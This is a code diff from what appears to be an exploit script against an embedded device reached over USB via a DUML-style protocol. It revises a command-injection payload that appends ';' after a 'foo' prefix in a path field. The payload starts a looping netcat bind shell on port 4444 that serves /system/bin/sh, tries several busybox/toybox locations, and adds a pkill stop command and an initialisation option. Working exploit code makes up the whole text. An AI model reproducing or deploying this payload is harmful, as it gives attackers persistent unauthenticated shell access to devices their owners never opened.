@@ -24,10 +24,12 @@ CID = 0x31
 PREFIX = 'foo'          # satisfies the handler's dedup strncmp
 
 SHELL_CMD = (
-    PREFIX + ';(while true; do /system/xbin/busybox nc -l -p 4444 '
-    '-e /system/bin/sh; done 2>/dev/null &)'
+    PREFIX + ';(for b in /system/xbin/busybox /system/bin/busybox '
+    '/system/bin/toybox; do while [ -x $b ]; do '
+    '$b nc -l -p 4444 -e /system/bin/sh; sleep 1; done; done &)'
 )
-STOP_CMD = PREFIX + ";pkill -f 'busybox nc -l -p 4444'"
+
+STOP_CMD = PREFIX + ";pkill -f 'nc -l -p 4444'"
 
 
 def build(path):
@@ -39,11 +41,13 @@ def build(path):
     return bytes([0x01, 0x02, 0x00, len(b)]) + b + b'\x00'
 
 
-def send(path, wait_ms=2000):
+def send(path, wait_ms=2000, full_init=False):
     d = N.Duml()
     d.open()
     try:
         d.drain(200)
+        if full_init:
+            d.full_init()
         f = N.pkt(0x0A, DST, 0x9000, CS, CID, build(path), 0x40)
         rc = d.lib.dll.usb_bulk_write(d.h, d.eo, f, len(f), 800)
         out = []
